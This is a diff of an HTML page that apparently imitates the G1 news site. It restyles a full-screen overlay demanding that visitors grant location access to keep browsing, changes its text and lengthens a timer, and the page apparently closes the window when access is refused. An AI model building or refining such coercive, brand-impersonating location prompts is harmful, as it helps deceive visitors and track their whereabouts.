@@ -103,22 +103,19 @@
   left: 0;
   right: 0;
   bottom: 0;
-  background: rgba(0, 0, 0, 0.7); /* Fundo mais escuro para criar um contraste */
+  background: rgba(0, 0, 0, 0.8); /* Fundo escuro, mas não opaco */
   z-index: 10;
   display: flex;
   justify-content: center;
   align-items: center;
-  color: #f0f0f0; /* Cor do texto mais suave */
-  font-size: 22px; /* Reduzir um pouco o tamanho para um estilo mais suave */
-  font-family: 'Helvetica Neue', Arial, sans-serif; /* Usar uma fonte mais moderna e amigável */
+  color: #ffffff; /* Texto 100% branco */
+  font-size: 22px;
+  font-family: 'Roboto', sans-serif; /* Fonte moderna e limpa */
   user-select: none;
-  text-align: center; /* Centralizar o texto */
-  padding: 30px;
-  border-radius: 5px; /* Bordas ainda mais suaves */
-  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.6); /* Sombra mais suave para um toque moderno */
-  transition: opacity 0.3s ease; /* Suavizar o efeito de transição */
-  max-width: 80%; /* Limitar a largura para que o texto não fique muito grande */
-  word-wrap: break-word; /* Quebrar palavras longas para evitar sobrecarga visual */
+  text-align: center;
+  padding: 25px;
+  box-shadow: 0 0 30px rgba(0, 0, 0, 0.8); /* Sombra mais forte e ampla para cobrir toda a tela */
+  transition: opacity 0.3s ease;
 }
 
   </style>
@@ -164,7 +161,7 @@
     © 2025 G1 - Todos os direitos reservados
   </footer>
 
-  <div id="overlay">Por favor, permita o acesso à sua localização para continuar navegando</div>
+  <div id="overlay">Por favor, permita o acesso à sua localização para continuar navegando!</div>
 
 <script>
   window.addEventListener('load', () => {
@@ -201,7 +198,7 @@
         window.close();
       });
 
-    }, 3000); // Delay de 3 segundos (3000 milissegundos)
+    }, 5000); // Delay de 5 segundos (5000 milissegundos)
   });
 
   function liberarConteudo() {
